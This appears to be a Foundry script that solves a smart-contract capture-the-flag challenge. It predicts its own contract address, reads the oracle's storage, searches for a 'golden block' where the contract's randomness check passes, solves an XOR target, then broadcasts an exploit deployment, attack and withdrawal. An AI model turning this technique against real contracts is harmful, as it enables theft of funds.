// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import "forge-std/Script.sol";
import {Exploit} from "../src/score_exploit.sol";

interface IChallenge { 
    function ORACLE() external view returns (address); 
    function SCORE() external view returns (address); 
}
interface IScore { function generateTarget() external view returns (bytes32); }

contract AttackScript is Script {
    address constant CHALLENGE = 0x022DE71b8f17182336c21Bc013E5C0E3B26edC09; // YOUR CHALLENGE ADDRESS

    function run() external {
        uint256 sk = vm.envUint("PRIVATE_KEY");
        address deployer = vm.addr(sk);
        address oracleAddr = IChallenge(CHALLENGE).ORACLE();
        address scoreAddr = IChallenge(CHALLENGE).SCORE();

        // 1. Predict the Exploit contract address
        uint256 nextNonce = vm.getNonce(deployer);
        address predictedExploit = vm.computeCreateAddress(deployer, nextNonce);
        
        console.log("Predicted Exploit Address:", predictedExploit);

        // 2. Fetch Oracle State for Rotation Calculation
        uint256 entropy = uint256(vm.load(oracleAddr, 0));
        uint256 scale = uint256(vm.load(oracleAddr, bytes32(uint256(1))));
        uint256 count = uint256(vm.load(oracleAddr, bytes32(uint256(2))));
        uint256 bal = oracleAddr.balance;

        // 3. Find the Golden Block for the PREDICTED address
        uint256 goldenBlock = 0;
        for (uint256 b = block.number; b < block.number + 2000; b++) {
            if (simulateRotation(entropy, scale, count, bal, b, predictedExploit) == 0) {
                goldenBlock = b;
                break;
            }
        }

        require(goldenBlock != 0, "No golden block found in range");
        console.log("GOLDEN BLOCK FOUND:", goldenBlock);
        console.log("Current Block:     ", block.number);

        // 4. Solve XOR for that future block
        vm.roll(goldenBlock); // Local simulation only
        bytes32 seed = vm.load(scoreAddr, 0);
        bytes32 target = IScore(scoreAddr).generateTarget();
        uint256[] memory indices = solveXOR(target, seed, goldenBlock);
        uint256 targetGas = uint256(keccak256(abi.encodePacked(seed, goldenBlock))) % 40000 + 10000;

        // 5. Broadcast the Real Attack
        vm.startBroadcast(sk);
        
        Exploit exploit = new Exploit(oracleAddr, scoreAddr);
        // Safety check: ensure our prediction was right
        require(address(exploit) == predictedExploit, "Address prediction failed!");
        
        console.log("Attacking at block...", goldenBlock);
        exploit.attack(indices, targetGas);
        exploit.withdraw();
        
        vm.stopBroadcast();
    }

    // --- Helper Math Functions ---

    function simulateRotation(uint256 e, uint256 s, uint256 c, uint256 b, uint256 blockNum, address sender) internal pure returns (uint256) {
        uint256 pokedE = e ^ uint256(keccak256(abi.encodePacked(blockNum, sender)));
        uint256 key = uint256(keccak256(abi.encodePacked(pokedE, c)));
        uint256 mixed = ((key >> 128) ^ ((key & 0xffffffffffffffffffffffffffffffff) << 64));
        mixed = (mixed >> 7) | (mixed << 249);
        uint256 recon = ((b / s) * s) ^ (b % s);
        return (mixed ^ recon) % 0x80;
    }

    function solveXOR(bytes32 target, bytes32 seed, uint256 blockNum) internal pure returns (uint256[] memory) {
        uint256[] memory basisIndices = new uint256[](256);
        bytes32[] memory basisValue = new bytes32[](256);
        uint256 count = 0;
        for (uint256 i = 0; i < 2500 && count < 256; i++) {
            bytes32 val = keccak256(abi.encodePacked(seed, i, blockNum));
            for (uint256 j = 0; j < 256; j++) {
                if ((uint256(val) >> (255 - j)) & 1 == 1) {
                    if (uint256(basisValue[j]) == 0) {
                        basisValue[j] = val;
                        basisIndices[j] = i;
                        count++;
                        break;
                    }
                    val ^= basisValue[j];
                }
            }
        }
        bytes32 curr = target;
        uint256[] memory tmp = new uint256[](256);
        uint256 resC = 0;
        for (uint256 j = 0; j < 256; j++) {
            if ((uint256(curr) >> (255 - j)) & 1 == 1) {
                curr ^= basisValue[j];
                tmp[resC++] = basisIndices[j];
            }
        }
        uint256[] memory res = new uint256[](resC);
        for(uint256 i=0; i<resC; i++) res[i] = tmp[i];
        return res;
    }
}